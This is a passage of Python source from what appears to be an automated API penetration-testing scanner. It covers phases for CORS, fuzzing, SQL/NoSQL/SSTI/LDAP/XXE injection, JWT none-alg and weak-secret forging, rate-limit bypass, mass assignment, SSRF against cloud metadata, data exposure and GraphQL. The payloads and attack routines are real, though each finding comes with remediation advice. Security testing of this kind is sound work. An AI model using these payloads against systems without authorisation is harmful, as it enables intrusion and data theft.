    # CORS wildcard check
    cors_tests = [
        ("Origin", "https://evil.com"),
    ]
    for hdr_name, hdr_val in cors_tests:
        test_resp = _safe_get(sess, base_url, timeout=timeout,
                              headers={hdr_name: hdr_val})
        if test_resp:
            acao = test_resp.headers.get("Access-Control-Allow-Origin", "")
            acac = test_resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                output.add_finding(
                    phase="recon",
                    title="Permissive CORS — Wildcard Origin",
                    severity="MEDIUM",
                    url=base_url,
                    detail="API allows requests from any origin (CORS: *).",
                    evidence=f"Access-Control-Allow-Origin: {acao}",
                    remediation="Restrict CORS to specific trusted origins.",
                )
            elif acao == "https://evil.com":
                sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
                output.add_finding(
                    phase="recon",
                    title="CORS Origin Reflection",
                    severity=sev,
                    url=base_url,
                    detail="API reflects arbitrary Origin header in CORS response.",
                    evidence=f"Access-Control-Allow-Origin: {acao}, Credentials: {acac}",
                    remediation="Validate Origin against an allowlist before reflecting.",
                )

    con.status("recon", "done", f"Server: {server or 'unknown'}")


# ---------------------------------------------------------------------------
# Phase 2: Fuzzing — HTTP method fuzzing + parameter fuzzing
# ---------------------------------------------------------------------------

_ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
_COMMON_PARAMS = ["id", "user_id", "account_id", "admin", "debug",
                  "format", "callback", "jsonp", "token", "key", "api_key",
                  "page", "limit", "sort", "filter", "search", "q"]
_FUZZ_VALUES = ["1", "true", "admin", "null", "undefined", "0", "-1", "99999"]


def phase_fuzzing(settings: dict, sess: requests.Session,
                  output: OutputManager, inventory: list) -> None:
    """Phase 2: HTTP method and parameter fuzzing."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("fuzzing", "running", f"Fuzzing {len(inventory)} endpoints")

    endpoints_to_fuzz = inventory[:30]  # Cap to avoid excessive requests

    for ep in endpoints_to_fuzz:
        if _shutdown_requested:
            break
        path = ep["path"]
        url = root + path
        documented_methods = {ep["method"].upper()}

        # Method fuzzing: try undocumented methods
        for method in _ALL_METHODS:
            if method in documented_methods:
                continue
            resp = _safe_request(sess, method, url, timeout=timeout)
            if not resp:
                continue
            if resp.status_code not in (405, 404, 400, 501, 403):
                output.add_finding(
                    phase="fuzzing",
                    title="Undocumented HTTP Method Accepted",
                    severity="MEDIUM",
                    url=url,
                    detail=(f"Method {method} returned HTTP {resp.status_code} "
                            f"on endpoint documented as {ep['method']} only."),
                    evidence=f"{method} {url} -> {resp.status_code}",
                    remediation="Restrict allowed HTTP methods per endpoint.",
                )

        # Parameter fuzzing: inject common params not in spec
        documented_param_names = {p["name"] for p in ep.get("params", [])}
        fuzz_params = [p for p in _COMMON_PARAMS if p not in documented_param_names]
        for param in fuzz_params[:5]:  # limit per endpoint
            for val in _FUZZ_VALUES[:2]:
                test_url = f"{url}?{param}={val}"
                resp = _safe_get(sess, test_url, timeout=timeout)
                if resp and resp.status_code == 200:
                    # Check if response differs from baseline (param had effect)
                    base_resp = _safe_get(sess, url, timeout=timeout)
                    if (base_resp and
                            abs(len(resp.text) - len(base_resp.text)) > 100):
                        output.add_finding(
                            phase="fuzzing",
                            title="Undocumented Parameter Accepted",
                            severity="LOW",
                            url=test_url,
                            detail=(f"Parameter '{param}={val}' produced "
                                    f"different response (size diff: "
                                    f"{abs(len(resp.text) - len(base_resp.text))})."),
                            evidence=f"GET {test_url} -> {resp.status_code}",
                            remediation="Document all accepted parameters; reject unknown ones.",
                        )
                    break

    con.status("fuzzing", "done", "Method and parameter fuzzing complete")


# ---------------------------------------------------------------------------
# Phase 3: Injection — SQLi, NoSQLi, SSTI, XXE, LDAP
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS = [
    ("'", "single quote"),
    ("' OR '1'='1", "OR injection"),
    ("1' AND SLEEP(5)--", "time-based blind"),
    ("\" OR \"1\"=\"1", "double-quote OR"),
    ("1; DROP TABLE users--", "stacked query"),
]

_NOSQLI_PAYLOADS = [
    ('{"$ne": null}', "not-equal null"),
    ('{"$gt": ""}',   "greater-than empty"),
    ('{"$where": "1==1"}', "where clause"),
    ('[$ne]=1', "array not-equal"),
]

_SSTI_PAYLOADS = [
    ("{{7*7}}", "Jinja2/Twig"),
    ("${7*7}",  "FreeMarker/Velocity"),
    ("#{7*7}",  "Thymeleaf"),
    ("<%= 7*7 %>", "ERB"),
    ("*{7*7}", "Spring EL"),
]

_LDAP_PAYLOADS = [
    ("*)(|(uid=*)", "LDAP wildcard"),
    ("*)(uid=*))(|(uid=*", "LDAP injection"),
    ("admin*", "LDAP wildcard prefix"),
]


def _test_injection(sess: requests.Session, url: str, method: str,
                    param_name: str, payload: str, timeout: int) -> requests.Response | None:
    """Send injection payload via query param or JSON body."""
    try:
        if method in ("GET", "HEAD"):
            test_url = f"{url}?{quote(param_name)}={quote(payload)}"
            return sess.get(test_url, timeout=timeout)
        else:
            body = {param_name: payload}
            return sess.request(method, url, json=body, timeout=timeout)
    except Exception:
        return None


def phase_injection(settings: dict, sess: requests.Session,
                    output: OutputManager, inventory: list) -> None:
    """Phase 3: Injection testing — SQLi, NoSQLi, SSTI, XXE, LDAP."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("injection", "running", f"Testing injection on {len(inventory)} endpoints")

    # Cap endpoints tested
    test_endpoints = inventory[:20]

    for ep in test_endpoints:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []

        # Collect testable parameters
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            # Fuzz common params anyway
            test_params = ["id", "q", "search", "username", "user", "filter"]

        for param in test_params[:4]:  # cap per endpoint
            # SQLi
            for payload, desc in _SQLI_PAYLOADS[:3]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and _SQL_ERR_RE.search(resp.text):
                    output.add_finding(
                        phase="injection",
                        title="SQL Injection in API Parameter",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"SQL error detected in response to parameter '{param}' "
                                f"with payload: {payload} ({desc})"),
                        evidence=f"Response snippet: {resp.text[:300]}",
                        remediation="Use parameterized queries; never concatenate user input into SQL.",
                    )
                    break

            # NoSQLi
            for payload, desc in _NOSQLI_PAYLOADS[:2]:
                try:
                    if method in ("GET", "HEAD"):
                        test_url = f"{url}?{param}={quote(payload)}"
                        resp = sess.get(test_url, timeout=timeout)
                    else:
                        # Try JSON operator injection
                        body = {param: {"$ne": None}}
                        resp = sess.request(method, url, json=body, timeout=timeout)
                    if resp and _NOSQL_ERR_RE.search(resp.text):
                        output.add_finding(
                            phase="injection",
                            title="NoSQL Injection in API Parameter",
                            severity="HIGH",
                            url=url,
                            detail=(f"NoSQL error pattern detected for parameter '{param}' "
                                    f"with payload: {payload}"),
                            evidence=f"Response snippet: {resp.text[:300]}",
                            remediation="Validate and sanitize inputs; use ODM query builders.",
                        )
                        break
                except Exception:
                    pass

            # SSTI
            for payload, desc in _SSTI_PAYLOADS[:3]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and re.search(r'\b49\b', resp.text):
                    output.add_finding(
                        phase="injection",
                        title="Server-Side Template Injection (SSTI)",
                        severity="CRITICAL",
                        url=url,
                        detail=(f"SSTI detected: payload '{payload}' ({desc}) evaluated to 49 "
                                f"in response for parameter '{param}'."),
                        evidence=f"Response contains '49': {resp.text[:200]}",
                        remediation="Never render user input as templates; use safe rendering contexts.",
                    )
                    break

            # LDAP
            for payload, desc in _LDAP_PAYLOADS[:2]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and resp.status_code == 200:
                    if re.search(r'(ldap|directory|dn=|objectClass)', resp.text, re.I):
                        output.add_finding(
                            phase="injection",
                            title="LDAP Injection in API Parameter",
                            severity="HIGH",
                            url=url,
                            detail=(f"Possible LDAP injection for parameter '{param}' "
                                    f"with payload: {payload}"),
                            evidence=f"Response snippet: {resp.text[:200]}",
                            remediation="Escape LDAP special characters in user input.",
                        )
                        break

    # XXE test — for endpoints that might accept XML
    for ep in test_endpoints[:5]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root>&xxe;</root>'
        )
        try:
            resp = sess.request(
                ep["method"], url,
                data=xxe_payload,
                headers={"Content-Type": "application/xml"},
                timeout=timeout,
            )
            if resp and re.search(r'(root:x:|nobody:|daemon:)', resp.text):
                output.add_finding(
                    phase="injection",
                    title="XML External Entity (XXE) Injection",
                    severity="CRITICAL",
                    url=url,
                    detail="XXE payload caused /etc/passwd content to appear in response.",
                    evidence=f"Response snippet: {resp.text[:300]}",
                    remediation="Disable external entity processing in XML parsers.",
                )
        except Exception:
            pass

    con.status("injection", "done", "Injection tests complete")


# ---------------------------------------------------------------------------
# Phase 4: Auth Bypass — JWT none-alg, weak HMAC, missing auth
# ---------------------------------------------------------------------------

_WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "api_key",
    "changeme", "mysecret", "token", "jwt", "supersecret",
    "test", "dev", "key", "private", "hs256", "default",
]


def _get_current_jwt(sess: requests.Session) -> str | None:
    """Extract JWT from session Authorization header."""
    auth_hdr = sess.headers.get("Authorization", "")
    if auth_hdr.startswith("Bearer "):
        token = auth_hdr[7:].strip()
        if len(token.split(".")) == 3:
            return token
    return None


def phase_auth_bypass(settings: dict, sess: requests.Session,
                      auth_sess, output: OutputManager,
                      inventory: list) -> None:
    """Phase 4: JWT algorithm confusion and auth bypass attacks."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("auth_bypass", "running", "Testing authentication bypass")

    # Find auth-required endpoints
    auth_endpoints = [ep for ep in inventory if ep.get("auth_required")]
    if not auth_endpoints and inventory:
        # Try any endpoint with auth session
        auth_endpoints = inventory[:5]

    if not auth_endpoints:
        # Probe base URL
        auth_endpoints = [{"method": "GET", "path": target["path"] or "/",
                           "params": [], "body_fields": [], "auth_required": True}]

    # 1. Test endpoints without auth (missing auth enforcement)
    anon_sess = _make_session(settings)
    for ep in auth_endpoints[:5]:
        url = root + ep["path"]
        resp = _safe_request(anon_sess, ep["method"], url, timeout=timeout)
        if resp and resp.status_code == 200:
            # Check response has meaningful content
            if len(resp.text) > 50:
                output.add_finding(
                    phase="auth_bypass",
                    title="Missing Authentication Enforcement",
                    severity="CRITICAL",
                    url=url,
                    detail=(f"Endpoint {ep['method']} {ep['path']} returned 200 "
                            f"without authentication."),
                    evidence=f"HTTP {resp.status_code}: {resp.text[:200]}",
                    remediation="Enforce authentication on all protected endpoints.",
                )

    # JWT attacks (only if auth session has a JWT)
    if auth_sess is None:
        con.status("auth_bypass", "done", "No auth session — skipping JWT tests")
        return

    token = _get_current_jwt(auth_sess)
    if not token:
        con.status("auth_bypass", "done", "No JWT in auth session")
        return

    decoded = _jwt_decode_token(token)
    if not decoded:
        con.status("auth_bypass", "done", "Could not decode auth token as JWT")
        return

    header, payload, _ = decoded

    # Check jku header
    if "jku" in header:
        output.add_finding(
            phase="auth_bypass",
            title="JWT Contains jku Header",
            severity="HIGH",
            url=base_url,
            detail=(f"JWT header contains 'jku' field pointing to: {header['jku']}. "
                    f"This may allow JWK Set URL injection attacks."),
            evidence=f"JWT header: {json.dumps(header)}",
            remediation="Pin the JWK Set URL server-side; never trust the jku header.",
        )

    # Check kid header for path traversal
    if "kid" in header:
        kid_val = str(header["kid"])
        if "/" in kid_val or ".." in kid_val or "\\" in kid_val:
            output.add_finding(
                phase="auth_bypass",
                title="JWT kid Header Path Traversal",
                severity="HIGH",
                url=base_url,
                detail=f"JWT kid header contains path-like value: {kid_val}",
                evidence=f"JWT header kid: {kid_val}",
                remediation="Validate the kid parameter; do not use it as a file path.",
            )

    # 2. None algorithm attack
    none_token = _jwt_none_alg(token)
    if none_token:
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {none_token}"
        for ep in auth_endpoints[:3]:
            url = root + ep["path"]
            resp = _safe_request(test_sess, ep["method"], url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="auth_bypass",
                    title="JWT None Algorithm Accepted",
                    severity="CRITICAL",
                    url=url,
                    detail=(f"Server accepted JWT with alg:none (no signature) "
                            f"on {ep['method']} {ep['path']}."),
                    evidence=f"none-alg token accepted, HTTP {resp.status_code}",
                    remediation="Reject JWTs with alg:none; enforce strict algorithm validation.",
                )
                break

    # 3. Weak HMAC secret brute force
    for secret in _WEAK_JWT_SECRETS:
        forged = _jwt_forge_hs256(token, secret)
        if not forged:
            continue
        test_sess = _make_session(settings)
        test_sess.headers["Authorization"] = f"Bearer {forged}"
        for ep in auth_endpoints[:2]:
            url = root + ep["path"]
            resp = _safe_request(test_sess, ep["method"], url, timeout=timeout)
            if resp and resp.status_code in (200, 201):
                output.add_finding(
                    phase="auth_bypass",
                    title="Weak JWT Secret",
                    severity="HIGH",
                    url=url,
                    detail=f"JWT was re-signed with weak secret '{secret}' and accepted.",
                    evidence=f"Secret '{secret}' produced valid JWT; HTTP {resp.status_code}",
                    remediation="Use a long, random, cryptographically secure JWT secret.",
                )
                break

    con.status("auth_bypass", "done", "Auth bypass testing complete")


# ---------------------------------------------------------------------------
# Phase 5: Rate Limiting
# ---------------------------------------------------------------------------

_RATE_BYPASS_HEADERS = [
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Real-IP": "10.0.0.2"},
    {"True-Client-IP": "10.0.0.3"},
    {"X-Originating-IP": "10.0.0.4"},
    {"X-Remote-IP": "10.0.0.5"},
    {"X-Cluster-Client-IP": "10.0.0.6"},
    {"CF-Connecting-IP": "10.0.0.7"},
    {"X-Forwarded-For": "127.0.0.1"},
]


def phase_rate_limiting(settings: dict, sess: requests.Session,
                        output: OutputManager, inventory: list) -> None:
    """Phase 5: Rate limit detection and bypass."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    threshold = scan.get("rate_limit_threshold", 50)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("rate_limiting", "running", f"Sending {threshold} requests to detect rate limits")

    # Find login-like endpoints for rate limit testing
    auth_endpoints = [ep for ep in inventory
                      if any(kw in ep["path"].lower()
                             for kw in ("login", "auth", "token", "signin", "sign-in"))]
    if not auth_endpoints:
        auth_endpoints = inventory[:1] if inventory else []

    test_url = (root + auth_endpoints[0]["path"]) if auth_endpoints else base_url

    # Rapid fire test
    got_429 = False
    rate_limited_at = None
    for i in range(threshold):
        if _shutdown_requested:
            break
        resp = _safe_get(sess, test_url, timeout=timeout)
        if resp and resp.status_code == 429:
            got_429 = True
            rate_limited_at = i + 1
            break

    if not got_429:
        output.add_finding(
            phase="rate_limiting",
            title="Missing Rate Limiting",
            severity="MEDIUM",
            url=test_url,
            detail=(f"No rate limiting detected after {threshold} rapid requests. "
                    f"API may be vulnerable to brute force and DoS attacks."),
            evidence=f"{threshold} requests sent without receiving HTTP 429",
            remediation="Implement rate limiting per IP and per user on sensitive endpoints.",
        )
    else:
        con.info(f"Rate limit detected at request #{rate_limited_at}")

    # Test IP header bypass
    if got_429:
        for bypass_hdr in _RATE_BYPASS_HEADERS:
            bypass_sess = _make_session(settings)
            bypass_sess.headers.update(bypass_hdr)
            # Send threshold requests with spoofed header
            bypass_success = True
            for i in range(min(threshold, 20)):
                resp = _safe_get(bypass_sess, test_url, timeout=timeout)
                if resp and resp.status_code == 429:
                    bypass_success = False
                    break
            if bypass_success:
                hdr_name = list(bypass_hdr.keys())[0]
                hdr_val  = list(bypass_hdr.values())[0]
                output.add_finding(
                    phase="rate_limiting",
                    title="Rate Limit Bypass via IP Header Spoofing",
                    severity="HIGH",
                    url=test_url,
                    detail=(f"Rate limit bypassed by setting {hdr_name}: {hdr_val}. "
                            f"The server trusts client-supplied IP headers."),
                    evidence=f"Header: {hdr_name}: {hdr_val} bypassed rate limit",
                    remediation="Do not trust client IP headers for rate limiting; use actual socket IP.",
                )
                break

    con.status("rate_limiting", "done", "Rate limiting tests complete")


# ---------------------------------------------------------------------------
# Phase 6: Mass Assignment
# ---------------------------------------------------------------------------

_MASS_ASSIGN_PAYLOADS = [
    {"is_admin": True},
    {"role": "admin"},
    {"is_vip": True},
    {"premium": True},
    {"account_balance": 99999},
    {"credit": 1000},
    {"__admin__": True},
    {"permissions": ["admin", "superuser"]},
    {"admin": True},
    {"is_staff": True},
    {"superuser": True},
    {"verified": True},
    {"email_verified": True},
    {"price": 0},
    {"discount": 100},
]


def phase_mass_assignment(settings: dict, sess: requests.Session,
                          auth_sess, output: OutputManager,
                          inventory: list) -> None:
    """Phase 6: Mass assignment / over-posting attack testing."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"
    extra_fields = scan.get("mass_assignment_fields", [])

    con.status("mass_assignment", "running", "Testing mass assignment")

    active_sess = auth_sess or sess
    write_methods = ("POST", "PUT", "PATCH")
    write_endpoints = [ep for ep in inventory if ep["method"] in write_methods]

    if not write_endpoints:
        con.status("mass_assignment", "skip", "No writable endpoints in inventory")
        return

    # Build combined mass-assign payload
    combined_payload = {}
    for p in _MASS_ASSIGN_PAYLOADS:
        combined_payload.update(p)
    for field in extra_fields:
        combined_payload[field] = True

    for ep in write_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        body_fields = ep.get("body_fields", [])

        # Build normal body (empty / default values)
        normal_body = {f: "" for f in body_fields}

        # Normal request baseline
        baseline = _safe_request(active_sess, method, url,
                                  json=normal_body, timeout=timeout)

        # Mass assignment attempt: add extra fields
        attack_body = {**normal_body, **combined_payload}
        attack_resp = _safe_request(active_sess, method, url,
                                     json=attack_body, timeout=timeout)

        if attack_resp and attack_resp.status_code in (200, 201):
            try:
                attack_data = attack_resp.json()
                attack_keys = set(_extract_json_keys(attack_data))
                # Check if any extra fields appear in response
                privileged_keys = {
                    "is_admin", "admin", "role", "is_vip", "premium",
                    "permissions", "is_staff", "superuser",
                }
                leaked = attack_keys & privileged_keys
                if leaked:
                    output.add_finding(
                        phase="mass_assignment",
                        title="Mass Assignment Vulnerability",
                        severity="HIGH",
                        url=url,
                        detail=(f"Privileged fields accepted and reflected in response: "
                                f"{', '.join(leaked)}"),
                        evidence=f"Response keys: {list(leaked)}",
                        remediation=(
                            "Use allowlists to define accepted fields; "
                            "never bind request body directly to data models."
                        ),
                    )
                elif (baseline and
                      attack_resp.text != baseline.text and
                      len(attack_resp.text) > len(normal_body.__str__())):
                    output.add_finding(
                        phase="mass_assignment",
                        title="Possible Mass Assignment — Response Differs",
                        severity="MEDIUM",
                        url=url,
                        detail=(f"Response to mass-assignment payload differs from baseline "
                                f"on {method} {ep['path']}."),
                        evidence=f"Baseline size: {len(baseline.text) if baseline else 0}, Attack size: {len(attack_resp.text)}",
                        remediation="Review endpoint for unintended field binding.",
                    )
            except Exception:
                pass

    con.status("mass_assignment", "done", "Mass assignment testing complete")


# ---------------------------------------------------------------------------
# Phase 7: SSRF
# ---------------------------------------------------------------------------

_SSRF_PARAM_NAMES = re.compile(
    r'(url|uri|endpoint|callback|redirect|webhook|src|source|'
    r'dest|destination|next|target|host|domain|feed|link|'
    r'file|image|path|load|fetch|resource|location|site)',
    re.IGNORECASE
)

_SSRF_PAYLOADS = [
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://localhost:8080/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://metadata.google.internal/",
]


def phase_ssrf(settings: dict, sess: requests.Session,
               auth_sess, output: OutputManager, inventory: list) -> None:
    """Phase 7: SSRF via API URL parameters."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("ssrf", "running", "Testing SSRF in URL parameters")

    active_sess = auth_sess or sess

    ssrf_tested = 0
    for ep in inventory[:30]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", [])
        body_fields = ep.get("body_fields", [])
        all_params = [p["name"] for p in params] + body_fields

        # Find URL-like parameters
        url_params = [p for p in all_params if _SSRF_PARAM_NAMES.search(p)]

        # Also probe path for URL-like parameter names embedded in path
        path_parts = ep["path"].split("/")
        for part in path_parts:
            if _SSRF_PARAM_NAMES.search(part) and part not in url_params:
                url_params.append(part)

        if not url_params:
            continue

        for param in url_params[:2]:
            for payload in _SSRF_PAYLOADS[:4]:
                ssrf_tested += 1
                try:
                    if method in ("GET", "HEAD"):
                        test_url = f"{url}?{quote(param)}={quote(payload)}"
                        resp = active_sess.get(test_url, timeout=timeout)
                    else:
                        body = {param: payload}
                        resp = active_sess.request(method, url, json=body, timeout=timeout)

                    if resp:
                        if _SSRF_INTERNAL_RE.search(resp.text):
                            sev = "CRITICAL" if "meta-data" in payload else "HIGH"
                            output.add_finding(
                                phase="ssrf",
                                title="SSRF via API Parameter",
                                severity=sev,
                                url=url,
                                detail=(f"SSRF payload in parameter '{param}' triggered "
                                        f"internal content in response. Payload: {payload}"),
                                evidence=f"Response contained internal indicators: {resp.text[:300]}",
                                remediation=(
                                    "Validate and allowlist URLs; "
                                    "block internal IP ranges; use SSRF-safe HTTP clients."
                                ),
                            )
                            break
                        elif resp.status_code in (200, 201) and resp.elapsed.total_seconds() > 3:
                            output.add_finding(
                                phase="ssrf",
                                title="Possible SSRF — Delayed Response",
                                severity="MEDIUM",
                                url=url,
                                detail=(f"Parameter '{param}' with SSRF payload caused "
                                        f"{resp.elapsed.total_seconds():.1f}s delay."),
                                evidence=f"Payload: {payload}, delay: {resp.elapsed.total_seconds():.1f}s",
                                remediation="Validate URL parameters against an allowlist.",
                            )
                except Exception:
                    pass

    if ssrf_tested == 0:
        con.info("No URL-accepting parameters found for SSRF testing")

    con.status("ssrf", "done", f"SSRF tested on {ssrf_tested} parameter/payload combinations")


# ---------------------------------------------------------------------------
# Phase 8: Data Exposure
# ---------------------------------------------------------------------------

_SENSITIVE_FIELD_RE = re.compile(
    r'\b(password|passwd|secret|token|api_key|apikey|ssn|social_security|'
    r'credit_card|cc_number|card_number|cvv|private_key|private|'
    r'access_token|refresh_token|client_secret|aws_secret|'
    r'auth_token|session_token)\b',
    re.IGNORECASE
)


def phase_data_exposure(settings: dict, sess: requests.Session,
                        auth_sess, output: OutputManager, inventory: list) -> None:
    """Phase 8: Excessive data exposure in API responses."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("data_exposure", "running", "Checking API responses for sensitive data")

    active_sess = auth_sess or sess
    get_endpoints = [ep for ep in inventory if ep["method"] == "GET"]

    for ep in get_endpoints[:20]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        resp = _safe_get(active_sess, url, timeout=timeout)
        if not resp or resp.status_code != 200:
            continue

        # Try to parse JSON response
        try:
            data = resp.json()
        except Exception:
            # Check raw text for sensitive patterns
            matches = _SENSITIVE_FIELD_RE.findall(resp.text)
            if matches:
                unique_matches = list(set(m.lower() for m in matches))
                output.add_finding(
                    phase="data_exposure",
                    title="Sensitive Data Exposed in API Response",
                    severity="HIGH",
                    url=url,
                    detail=(f"Response body contains potentially sensitive field names: "
                            f"{', '.join(unique_matches)}"),
                    evidence=f"Fields found: {unique_matches}; response snippet: {resp.text[:200]}",
                    remediation="Filter sensitive fields from API responses; apply response masks.",
                )
            continue

        # Check response keys recursively
        all_keys = _extract_json_keys(data)
        sensitive_found = [k for k in all_keys if _SENSITIVE_FIELD_RE.search(k.split(".")[-1])]

        if sensitive_found:
            # Check actual values too — if non-empty, more serious
            has_values = False
            if isinstance(data, dict):
                for sf in sensitive_found[:3]:
                    top_key = sf.split(".")[0]
                    val = data.get(top_key)
                    if val and isinstance(val, str) and len(val) > 3:
                        has_values = True
                        break
            elif isinstance(data, list) and data:
                first = data[0] if isinstance(data[0], dict) else {}
                for sf in sensitive_found[:3]:
                    top_key = sf.split(".")[0]
                    val = first.get(top_key)
                    if val and isinstance(val, str) and len(val) > 3:
                        has_values = True
                        break

            severity = "HIGH" if has_values else "MEDIUM"
            output.add_finding(
                phase="data_exposure",
                title="Excessive Data Exposure — Sensitive Fields in API Response",
                severity=severity,
                url=url,
                detail=(f"API response contains sensitive field names: "
                        f"{', '.join(sensitive_found[:10])}"),
                evidence=f"Sensitive keys: {sensitive_found[:5]}",
                remediation=(
                    "Apply field-level filtering; use response DTOs; "
                    "never expose internal model fields in API responses."
                ),
            )

        # Check for excessive fields (more than documented)
        documented_fields = set(p["name"] for p in ep.get("params", []))
        documented_fields |= set(ep.get("body_fields", []))
        if documented_fields and len(all_keys) > len(documented_fields) * 3:
            output.add_finding(
                phase="data_exposure",
                title="API Returns More Fields Than Documented",
                severity="LOW",
                url=url,
                detail=(f"Response contains {len(all_keys)} fields; "
                        f"spec documents ~{len(documented_fields)} parameters."),
                evidence=f"Extra keys sample: {all_keys[:5]}",
                remediation="Use response schemas to limit which fields are returned.",
            )

    con.status("data_exposure", "done", "Data exposure analysis complete")


# ---------------------------------------------------------------------------
# Phase 9: GraphQL
# ---------------------------------------------------------------------------

_GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/graphiql",
    "/api/graphiql",
    "/graph",
    "/query",
]

_INTROSPECTION_QUERY = {
    "query": (
        "{ __schema { types { name fields { name type { name kind } } } } }"
    )
}

_DEPTH_ATTACK_QUERY = {
    "query": (
        "{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }"
    )
}


def phase_graphql(settings: dict, sess: requests.Session,
                  auth_sess, output: OutputManager) -> None:
    """Phase 9: GraphQL introspection and query depth attacks."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("graphql", "running", "Probing for GraphQL endpoints")

    active_sess = auth_sess or sess
    gql_found = None

    for gql_path in _GRAPHQL_PATHS:
        url = root + gql_path
        # Simple probe
        resp = _safe_request(active_sess, "POST", url,
                             json={"query": "{ __typename }"},
                             timeout=timeout)
        if resp and resp.status_code in (200, 400):
            try:
                data = resp.json()
                if "data" in data or "errors" in data:
                    gql_found = url
                    con.info(f"GraphQL endpoint found: {url}")
                    break
            except Exception:
                pass

    if not gql_found:
        con.status("graphql", "skip", "No GraphQL endpoint found")
        return

    # Introspection
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=_INTROSPECTION_QUERY, timeout=timeout)
    if resp:
        try:
            data = resp.json()
            if "data" in data and "__schema" in data.get("data", {}):
                schema_data = data["data"]["__schema"]
                types = schema_data.get("types", [])
                type_names = [t["name"] for t in types if not t["name"].startswith("__")]
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Introspection Enabled",
                    severity="LOW",
                    url=gql_found,
                    detail=(f"GraphQL introspection is enabled, exposing full schema. "
                            f"Found {len(type_names)} types."),
                    evidence=f"Types: {type_names[:10]}",
                    remediation=(
                        "Disable introspection in production GraphQL endpoints. "
                        "Restrict to authenticated developers only."
                    ),
                )
        except Exception:
            pass

    # Query depth attack
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=_DEPTH_ATTACK_QUERY, timeout=timeout)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            if "errors" not in data:
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Query Depth Attack",
                    severity="MEDIUM",
                    url=gql_found,
                    detail="GraphQL endpoint accepted a 10-level deep nested query without error.",
                    evidence=f"Depth-10 query returned HTTP 200 without depth errors",
                    remediation="Implement query depth limiting (max 3-5 levels) in the GraphQL server.",
                )
        except Exception:
            pass

    con.status("graphql", "done", f"GraphQL testing complete at {gql_found}")


# ---------------------------------------------------------------------------
# Phase 10: BOLA/IDOR
# ---------------------------------------------------------------------------

_ID_PARAM_RE = re.compile(r'\{([^}]+)\}|:([a-zA-Z_][a-zA-Z0-9_]*)$|/(\d+)$')


def _extract_path_ids(path: str) -> list:
    """Extract path parameter names and numeric IDs from a path template."""
    ids = []
    # OAS-style {param}
    for m in re.finditer(r'\{([^}]+)\}', path):
        ids.append(m.group(1))
    # Express-style :param
    for m in re.finditer(r':([a-zA-Z_][a-zA-Z0-9_]*)', path):
        ids.append(m.group(1))
    # Literal numeric IDs
    for m in re.finditer(r'/(\d+)(?:/|$)', path):
        ids.append(m.group(1))
    return ids


def phase_bola(settings: dict, auth_sess, output: OutputManager,
               inventory: list) -> None:
    """Phase 10: BOLA/IDOR — cross-user object access."""
    if auth_sess is None:
        con.status("bola", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("bola", "running", "Testing BOLA/IDOR vulnerabilities")

    # Find endpoints with ID parameters
    id_endpoints = []
    for ep in inventory:
        if ep["method"] == "GET":
            ids = _extract_path_ids(ep["path"])
            if ids:
